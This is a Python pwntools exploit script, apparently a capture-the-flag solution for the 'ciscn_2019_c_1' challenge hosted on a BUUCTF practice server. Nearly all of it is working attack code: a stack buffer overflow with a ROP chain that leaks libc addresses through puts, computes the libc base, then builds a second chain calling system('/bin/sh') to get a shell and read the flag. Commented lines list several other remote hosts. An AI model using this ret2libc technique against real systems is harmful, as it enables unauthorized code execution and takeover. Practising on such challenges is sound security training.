# import time
from pwn import *

# from LibcSearcher import *
# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
# io = remote("192.168.170.128", 9999)
# io = remote("43.249.195.138",  20431)
# io = remote("8.130.35.16", 52003)
# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
io = remote("node4.buuoj.cn", 27161)
# io = remote("112.6.51.212", 30791)

# io = process('./q2')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
# elf = ELF('./stack')
# libc = ELF('./2.31-0ubuntu9_amd64/libc-2.31.so')


# libc = ELF('./libc-2.31.so')

def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result

def libc_send_payload(ru1, ru2, padding, to_print_got, pop_rdi, ret2addr, puts_plt):
    ru(b'Input your choice!')
    sl(b'1')
    payload = b'\x00' + b'a' * padding + p64(pop_rdi) + p64(to_print_got) + p64(puts_plt) + p64(ret2addr)
    ru(b'encrypted\n')
    sl(payload)
    gets_addr = get_addr()
    print(hex(gets_addr))

context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")


# back = 0x04012EE
# ru(b'size: ')
# sl(b'100')
# ru(b'>')
# sl(b'a' * 0x28 + p64(back))

main_addr = 0x400B28
elf = ELF('./ciscn_2019_c_1')
elf_got = elf.got['puts']
elf_plt = elf.plt['puts']
gets_got = elf.got['gets']
setvbuf_got = elf.got['setvbuf']
strlen_got = elf.got['strlen']
print("elf_got =", hex(elf_got))
print("elf_plt =", hex(elf_plt))
pop_rdi = 0x0000000000400c83
ret = 0x00000000004006b9

ru(b'Input your choice!')
sl(b'1')
payload = b'\x00' + b'a' * (0x50 + 8 - 1) + p64(pop_rdi) + p64(elf_got) + p64(elf_plt) + p64(main_addr)
ru(b'encrypted\n')
sl(payload)
puts_addr = get_addr()
print(hex(puts_addr))
libc_send_payload(b'Input your choice!', b'encrypted\n', 0x57, gets_got, pop_rdi, main_addr, elf_plt)
libc_send_payload(b'Input your choice!', b'encrypted\n', 0x57, setvbuf_got, pop_rdi, main_addr, elf_plt)
libc_send_payload(b'Input your choice!', b'encrypted\n', 0x57, strlen_got, pop_rdi, main_addr, elf_plt)

libc_base = puts_addr - 0x809c0
system = 0x4f440 + libc_base
binsh = 0x1b3e9a + libc_base

ru(b'Input your choice!')
sl(b'1')

payload1 = b'\x00' + b'a' * 0x57 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
sl(payload1)
sl(b'cat flag')

inter()
